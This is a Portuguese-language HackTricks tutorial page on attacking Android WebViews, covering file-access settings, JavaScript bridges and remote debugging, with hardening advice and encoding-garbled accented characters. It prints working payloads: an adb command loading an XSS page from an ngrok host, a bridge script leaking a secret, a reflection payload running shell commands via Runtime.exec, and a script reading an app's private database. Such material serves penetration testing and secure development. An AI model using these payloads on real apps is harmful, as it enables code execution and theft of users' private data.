# Ataques a Webview

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Configura√ß√µes Interessantes

Voc√™ pode identificar um WebView exposto assim:

<figure><img src="../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

### Acesso a Arquivos

O acesso a arquivos no _WebView_ √© habilitado por padr√£o. Desde a API 3 (Cupcake 1.5), o m√©todo [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) est√° dispon√≠vel para habilitar ou desabilitar explicitamente.\
Se o aplicativo tem a permiss√£o \_**android.permission.READ\_EXTERNAL\_STORAGE** \_, ele poder√° ler e carregar arquivos **do armazenamento externo**.\
O _WebView_ precisa usar um Esquema de URL de Arquivo, por exemplo, `file://path/file`, para acessar o arquivo.

#### Acesso Universal a Partir de URL de Arquivo (Obsoleto)

> Define se **solicita√ß√µes cross-origin** no **contexto de uma URL de esquema de arquivo** devem ser permitidas para acessar **conte√∫do de qualquer origem**. Isso inclui **acesso a conte√∫do de outras URLs de esquema de arquivo ou contextos web.** Note que alguns acessos, como elementos de imagem HTML, n√£o seguem as regras de mesma origem e n√£o s√£o afetados por essa configura√ß√£o.
>
> **N√£o** habilite essa configura√ß√£o se voc√™ abrir arquivos que podem ser criados ou alterados por fontes externas. Habilitar essa configura√ß√£o **permite que scripts maliciosos carregados em um contexto `file://`** lancem ataques de cross-site scripting, acessando **arquivos locais arbitr√°rios** incluindo cookies do WebView, dados privados do app ou mesmo credenciais usadas em sites arbitr√°rios.

Em resumo, isso vai **prevenir o carregamento de Origens arbitr√°rias.** O app enviar√° a solicita√ß√£o de URL para carregar o conte√∫do com **`Origin: file://`** se a resposta n√£o permitir essa origem (**`Access-Control-Allow-Origin: file://`**), ent√£o o conte√∫do n√£o ser√° carregado.\
O **valor padr√£o √© `false`** ao direcionar para [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) e acima.

* Use [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) para saber se o JavaScript executando no contexto de uma URL de esquema de arquivo pode acessar conte√∫do de qualquer origem (se UniversalAccessFromFileURL est√° habilitado).
* Use [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) para habilitar/desabilitar.

{% hint style="info" %}
Usar **`loadDataWithBaseURL()`** com `null` como baseURL tamb√©m **impedir√° o carregamento de arquivos locais** mesmo se todas as configura√ß√µes perigosas estiverem habilitadas.
{% endhint %}

#### Acesso a Arquivos a Partir de URLs de Arquivo (Obsoleto) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> Define se solicita√ß√µes cross-origin no contexto de uma URL de esquema de arquivo devem ser permitidas para acessar conte√∫do de outras URLs de esquema de arquivo. Note que alguns acessos, como elementos de imagem HTML, n√£o seguem as regras de mesma origem e n√£o s√£o afetados por essa configura√ß√£o.
>
> **N√£o** habilite essa configura√ß√£o se voc√™ abrir arquivos que podem ser criados ou alterados por fontes externas. Habilitar essa configura√ß√£o permite que scripts maliciosos carregados em um contexto `file://` acessem arquivos locais arbitr√°rios incluindo cookies do WebView e dados privados do app.

Em resumo, isso impede que o javascript acesse arquivos locais via protocolo `file://`.\
Note que **o valor dessa configura√ß√£o √© ignorado** se o valor de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) for `true`.\
O **valor padr√£o √© `false`** ao direcionar para [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) e acima.

* Use [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) para saber se o JavaScript est√° executando no contexto de uma URL de esquema de arquivo pode acessar conte√∫do de outras URLs de esquema de arquivo.
* Use [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) para habilitar/desabilitar.

#### Acesso a Arquivos

> Habilita ou desabilita **acesso a arquivos dentro do WebView**. Note que isso habilita ou desabilita o acesso ao sistema de arquivos apenas. Ativos e recursos ainda s√£o acess√≠veis usando file:///android_asset e file:///android_res.

Em resumo, se desabilitado, o WebView n√£o ser√° capaz de carregar um arquivo local com o protocolo `file://`.\
O **valor padr√£o √© `false`** ao direcionar para [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) e acima.

* Use [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) para saber se a configura√ß√£o est√° habilitada.
* Use [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) para habilitar/desabilitar.

#### WebViewAssetLoader

> Classe auxiliar para carregar arquivos locais incluindo ativos est√°ticos do aplicativo e recursos usando URLs http(s):// dentro de uma classe [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Carregar arquivos locais usando URLs semelhantes √† web em vez de `"file://"` √© desej√°vel, pois √© compat√≠vel com a pol√≠tica de Mesma Origem.

Esta √© a nova maneira recomendada de carregar arquivos locais. O objetivo √© **acessar arquivos locais usando uma URL HTTP com o dom√≠nio**. Desta forma, o **CORS** pode ser **facilmente** mantido entre as **p√°ginas web locais** e as **p√°ginas web** que s√£o baixadas do servidor web.

### Javascript Habilitado

WebViews t√™m Javascript **desabilitado por padr√£o**. O m√©todo [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) pode habilitar ou desabilitar explicitamente.\
Note que webviews tamb√©m podem suportar o **esquema `intent`** que permite ativar outras aplica√ß√µes. Leia este [artigo para descobrir como ir de XSS para RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

Aqui est√° um exemplo de um WebView exposto vulner√°vel a XSS via o par√¢metro "support_url" (que pode indicar a URL para carregar no webview):

<figure><img src="../../.gitbook/assets/image (719).png" alt="" width="563"><figcaption></figcaption></figure>

√â poss√≠vel explorar essa vulnerabilidade a partir do adb com algo como:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://6333-157-48-216-175.ngrok-free.app/xss.html"
```
### Ponte Javascript

O Android oferece uma maneira do JavaScript executado em um WebView chamar e usar **fun√ß√µes nativas de um aplicativo Android** (anotadas com `@JavascriptInterface`) usando o m√©todo [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). Isso √© conhecido como _WebView JavaScript bridge_ ou _ponte nativa_.

Observe que **quando voc√™ usa `addJavascriptInterface`, est√° concedendo explicitamente acesso ao objeto de Interface JavaScript registrado a todas as p√°ginas carregadas naquele WebView**. Isso implica que, se o usu√°rio navegar para fora do seu aplicativo ou dom√≠nio, todas as outras p√°ginas externas tamb√©m ter√£o acesso a esses objetos de Interface JavaScript, o que pode representar um risco de seguran√ßa potencial se algum dado sens√≠vel estiver sendo exposto por essas interfaces.

> Aviso: Tenha extremo cuidado com aplicativos que visam vers√µes do Android abaixo do Android 4.2 (n√≠vel de API 17), pois eles s√£o [vulner√°veis a uma falha](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/) na implementa√ß√£o de `addJavascriptInterface`: um ataque que abusa da reflex√£o, o que leva √† execu√ß√£o remota de c√≥digo quando JavaScript malicioso √© injetado em um WebView. Isso ocorreu porque todos os m√©todos de Object Java eram acess√≠veis por padr√£o (em vez de apenas aqueles anotados).

#### An√°lise Est√°tica
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
// Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
// not annotated with @JavascriptInterface are not visible from JavaScript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Com acesso ao c√≥digo JavaScript, por exemplo, atrav√©s de um **XSS** armazenado, ataque **MITM** ou um **site malicioso** que √© carregado dentro do WebView, pode chamar diretamente os m√©todos Java expostos.

{% hint style="info" %}
Note que, no caso de tentar explorar essa vulnerabilidade via um **Redirecionamento Aberto para uma p√°gina web do atacante que acessa o Objeto Nativo do Android**. Se o acesso ao redirecionamento for feito via um **navegador m√≥vel** e **n√£o usando** o mesmo **WebView**, o **navegador n√£o poder√° acessar o objeto nativo do Android**.
{% endhint %}

Se `addJavascriptInterface` for necess√°rio, considere o seguinte:

* **Apenas JavaScript fornecido** com o APK deve ser permitido usar as pontes, por exemplo, verificando a URL em cada m√©todo Java ponteado (via `WebView.getUrl`).
* **Nenhum JavaScript deve ser carregado de endpoints remotos**, por exemplo, mantendo a navega√ß√£o da p√°gina dentro dos dom√≠nios do aplicativo e abrindo todos os outros dom√≠nios no navegador padr√£o (por exemplo, Chrome, Firefox).
* Se necess√°rio por raz√µes de legado (por exemplo, ter que suportar dispositivos mais antigos), **defina pelo menos o n√≠vel m√≠nimo da API para 17** no arquivo de manifesto do aplicativo (`<uses-sdk android:minSdkVersion="17" />`).

### Ponte JavaScript para RCE via Reflex√£o

Como observado em [**esta pesquisa**](https://labs.withsecure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_confira para ideias em caso de obter RCE_), uma vez que voc√™ encontrou uma JavascriptBridge, pode ser poss√≠vel obter **RCE** via **Reflex√£o** usando um payload como o seguinte:
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
No entanto, aplica√ß√µes modernas podem usar a **`@JavascriptInterface` annotation** que indica ao JavascriptBridge que **somente** o m√©todo com essa anota√ß√£o deve ser **exposto**.\
Nesse cen√°rio, voc√™ n√£o ser√° capaz de abusar da Reflection para executar c√≥digo arbitr√°rio.

### Depura√ß√£o Remota

A **depura√ß√£o remota do WebView** permite acessar o webview com as **Ferramentas de Desenvolvedor do Chrome.**\
O **dispositivo** precisa estar **acess√≠vel** pelo PC (via USB, emulador local, rede local...) e executando o WebView depur√°vel, ent√£o acesse **chrome://inspect/#devices**:

![](<../../.gitbook/assets/image (525).png>)

Selecione **inspect** e uma nova janela ser√° aberta. Nesta janela, voc√™ pode **interagir com o conte√∫do** do **WebView** e at√© fazer com que ele **execute c√≥digo JS arbitr√°rio** a partir da aba **console**:

![](<../../.gitbook/assets/image (526).png>)

Para habilitar a **Depura√ß√£o Remota do WebView** voc√™ pode fazer algo como:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
**Esta configura√ß√£o aplica-se a todos os WebViews da aplica√ß√£o.**

{% hint style="info" %}
**A depura√ß√£o do WebView n√£o √© afetada pelo estado da flag `debuggable`** no manifesto da aplica√ß√£o. Se deseja habilitar a depura√ß√£o do WebView apenas quando `debuggable` for `true`, teste a flag em tempo de execu√ß√£o.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Cargas √öteis

### Exfiltrar arquivos arbitr√°rios
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Refer√™ncias

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
